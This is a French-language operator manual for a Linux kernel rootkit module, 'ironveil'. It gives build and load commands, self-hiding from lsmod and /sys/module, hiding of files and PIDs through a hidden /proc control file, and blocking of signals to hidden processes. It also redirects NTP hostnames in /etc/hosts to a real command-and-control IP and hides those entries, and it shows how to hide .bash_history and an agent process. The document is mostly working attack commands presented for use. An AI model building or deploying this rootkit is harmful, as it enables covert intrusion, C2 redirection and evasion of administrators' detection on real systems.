# Manuel — Cipherfall LKM Rootkit

---

## Vue d'ensemble

```
  insmod ironveil.ko
        │
        ├─ inject_hosts()       ← écrit les entrées NTP dans /etc/hosts
        │
        ├─ kretprobe: __x64_sys_read        ← filtre /etc/hosts en lecture
        ├─ kretprobe: __x64_sys_getdents64  ← cache fichiers et PIDs
        ├─ kretprobe: __x64_sys_kill        ← bloque signaux vers PIDs cachés
        │
        ├─ proc_create("rootkit_ctrl")      ← interface de contrôle runtime
        │
        └─ module_selfhide()    ← disparaît de lsmod et /sys/module/
```

---

## Build

```bash
cd Modules/Rootkits

# Prérequis : linux-headers correspondant au noyau courant
apt install linux-headers-$(uname -r)   # Debian/Ubuntu
pacman -S linux-headers                 # Arch

make

# Résultat : ironveil.ko
```

---

## Chargement

```bash
# Chargement (nécessite root)
insmod ironveil.ko

# Vérifier le chargement — doit retourner RIEN (self-hidden)
lsmod | grep ironveil

# Vérifier les effets immédiats
dmesg | tail -5
```

Au chargement, deux actions sont automatiques :
1. **Injection /etc/hosts** — entrées NTP ajoutées (C2 redirect)
2. **Self-hide** — module retiré de `lsmod`, `/proc/modules`, `/sys/module/`

---

## Fonctionnalités

### 1. Cacher des fichiers / dossiers

Deux mécanismes coexistent.

**Préfixe automatique** — tout nom commençant par `rootkit_` est invisible :

```bash
touch /tmp/rootkit_secret.txt
ls /tmp/ | grep rootkit_secret    # rien
ls -la /tmp/ | grep rootkit_      # rien
```

**Nom arbitraire à la volée** via l'interface de contrôle :

```bash
echo "hide_file malware.py" > /proc/rootkit_ctrl
ls | grep malware.py              # rien

echo "unhide_file malware.py" > /proc/rootkit_ctrl
ls | grep malware.py              # visible à nouveau
```

> Limite : le fichier reste accessible par chemin complet direct (`cat /tmp/malware.py`).
> Seul le listing (`ls`, `find`, `opendir`) est filtré.

---

### 2. Cacher des processus

```bash
# Cacher un PID
echo "hide_pid 1337" > /proc/rootkit_ctrl

# Vérifier
ps aux | grep 1337        # absent
ls /proc/ | grep 1337     # absent
kill -0 1337              # retourne "No such process"

# Révéler
echo "unhide_pid 1337" > /proc/rootkit_ctrl
```

```
                    ┌─────────────────────────────┐
  kill(1337, sig)   │  kretprobe __x64_sys_kill   │
  ─────────────────►│  PID dans liste cachée ?    │
                    │  oui → retourne -ESRCH      │
                    └─────────────────────────────┘

  ls /proc/          ┌──────────────────────────────────┐
  ─────────────────►│  kretprobe __x64_sys_getdents64  │
                    │  entrée "1337" dans liste ?       │
                    │  oui → supprimée du buffer dirent │
                    └──────────────────────────────────┘
```

> Limite : `/proc/<pid>/exe` reste accessible à root.
> Cacher un dossier PID ne cache pas ses sous-entrées par chemin direct.

---

### 3. Masquer les entrées C2 dans /etc/hosts

Au chargement, le rootkit **écrit** ces lignes dans `/etc/hosts` :

```
87.106.187.97 ntp.ubuntu.com
87.106.187.97 0.debian.pool.ntp.org
87.106.187.97 2.fedora.pool.ntp.org
87.106.187.97 0.rhel.pool.ntp.org
87.106.187.97 0.centos.pool.ntp.org
87.106.187.97 0.arch.pool.ntp.org
87.106.187.97 0.opensuse.pool.ntp.org
87.106.187.97 0.pool.ntp.org
```

Le hook `read()` **filtre toute ligne contenant l'IP C2** à la volée :

```bash
cat /etc/hosts | grep 87.106      # rien
grep 87.106 /etc/hosts            # rien
strings /etc/hosts | grep 87.106  # rien
```

**Exception** : le processus C2 agent voit les entrées si son `comm` est `ntp-agent`.
L'agent positionne ce nom via `prctl(PR_SET_NAME, "ntp-agent")` avant la résolution DNS.

```
  Processus A (cat, grep, etc.)               Processus B (agent NTP)
  comm ≠ "ntp-agent"                          comm = "ntp-agent"
  read(/etc/hosts)                            read(/etc/hosts)
        │                                           │
        ▼                                           ▼
  hook actif                                  hook bypassé
  lignes 87.106 supprimées                    contenu réel retourné
        │                                           │
        ▼                                           ▼
  résolution DNS → vraie IP NTP               résolution DNS → 87.106.187.97
```

**Vérifier le vrai contenu** (bypass via mmap, non filtré) :

```bash
python3 -c "
import mmap
f = open('/etc/hosts', 'rb')
m = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)
print(m[:].decode())
" | grep 87.106
```

> Limite : `pread64()` et `mmap()` ne sont pas hookés — contenu visible par ces méthodes.

---

### 4. Self-hide

Exécuté automatiquement à la fin du `init`. Irréversible sans reboot.

```
  Avant insmod :                    Après insmod :
  lsmod → ... ironveil ...          lsmod → (absent)
  /proc/modules → ... ironveil ...  /proc/modules → (absent)
  /sys/module/ironveil/             /sys/module/ironveil/ → (absent)
```

> Conséquence : `rmmod ironveil` échoue — le module est introuvable.
> Les hooks restent actifs jusqu'au reboot.

---

## Interface de contrôle — /proc/rootkit_ctrl

Fichier écriture seule, lui-même invisible dans `ls /proc/`.

```
┌──────────────────────────────────────────────────────────────┐
│  COMMANDE                        EFFET                       │
├──────────────────────────────────────────────────────────────┤
│  hide_pid <PID>                  cache le PID                │
│  unhide_pid <PID>                révèle le PID               │
│  hide_file <nom>                 cache un fichier par nom    │
│  unhide_file <nom>               révèle un fichier par nom   │
└──────────────────────────────────────────────────────────────┘

Limites : max 64 PIDs, max 64 fichiers, noms ≤ 255 caractères.
```

Utilisation :

```bash
# Le fichier n'apparaît pas dans ls /proc/
ls /proc/ | grep rootkit_ctrl      # rien

# Mais l'écriture fonctionne
echo "hide_pid $(pgrep clockvenom.py)" > /proc/rootkit_ctrl
echo "hide_file .bash_history"    > /proc/rootkit_ctrl
```

---

## Procédure de test complète

```bash
# 1. Build
cd Modules/Rootkits && make

# 2. Charger
insmod ironveil.ko && echo "loaded"

# 3. Self-hide
lsmod | grep ironveil                    # doit retourner rien

# 4. Cacher un fichier (préfixe)
touch /tmp/rootkit_test
ls /tmp/ | grep rootkit_test            # rien

# 5. Cacher un fichier (runtime)
echo "hide_file secret.txt" > /proc/rootkit_ctrl
touch /tmp/secret.txt
ls /tmp/ | grep secret.txt              # rien
echo "unhide_file secret.txt" > /proc/rootkit_ctrl
ls /tmp/ | grep secret.txt              # visible

# 6. Cacher un processus
sleep 999 &
PID=$!
echo "hide_pid $PID" > /proc/rootkit_ctrl
ps aux | grep "sleep 999"               # absent
kill -0 $PID 2>&1                       # "No such process"
echo "unhide_pid $PID" > /proc/rootkit_ctrl
ps aux | grep "sleep 999"               # visible

# 7. /etc/hosts — entrées C2 invisibles
grep 87.106 /etc/hosts                  # rien
python3 -c "import mmap; f=open('/etc/hosts','rb'); m=mmap.mmap(f.fileno(),0,prot=mmap.PROT_READ); print(m[:].decode())" | grep 87.106
                                        # entrées visibles via mmap

# 8. Résolution DNS correcte côté agent
python3 -c "
import socket, ctypes
ctypes.CDLL('libc.so.6').prctl(15, b'ntp-agent', 0, 0, 0)
print(socket.gethostbyname('0.debian.pool.ntp.org'))
"                                       # doit afficher 87.106.187.97
```

---

## Déchargement / nettoyage

Le module **ne peut pas être déchargé** après self-hide (`rmmod` échoue).

Pour nettoyer avant reboot :

```bash
# Supprimer les entrées C2 de /etc/hosts (visibles uniquement via mmap/root)
sed -i '/87\.106/d' /etc/hosts

# Les hooks disparaissent au reboot
reboot
```

---

## Limites connues

| Limite | Détail |
|---|---|
| Pas de persistance | Hooks perdus au reboot ; entrées /etc/hosts survivent mais non cachées |
| rmmod impossible | Après self-hide, seul un reboot décharge le module |
| mmap non filtré | `mmap()` et `pread64()` de /etc/hosts voient le vrai contenu |
| Accès direct non bloqué | Fichiers cachés accessibles par chemin complet |
| /proc/\<pid\>/exe visible | Pour les processus root, exe pointe encore vers le vrai binaire |
| kretprobe maxactive | 32 instances concurrentes max ; appels en excès non interceptés |
| CONFIG_KPROBES requis | Module refuse de charger si kprobes désactivé dans le noyau |

---

## Compatibilité noyau

| Version | Mécanisme | Notes |
|---|---|---|
| ≥ 6.1 + BHI mitigations | kretprobes | `x64_sys_call()` bypass syscall table — seule méthode viable |
| 5.7 – 6.x | kretprobes | `kallsyms_lookup_name` non exporté, résolu via kprobe |
| 4.x – 5.6 | kretprobes | `kallsyms_lookup_name` exporté directement |
| < 4.x | Non supporté | API kretprobe insuffisante |

Testé sur : **Debian 12 (kernel 6.1.0-49-amd64, btrfs)**.
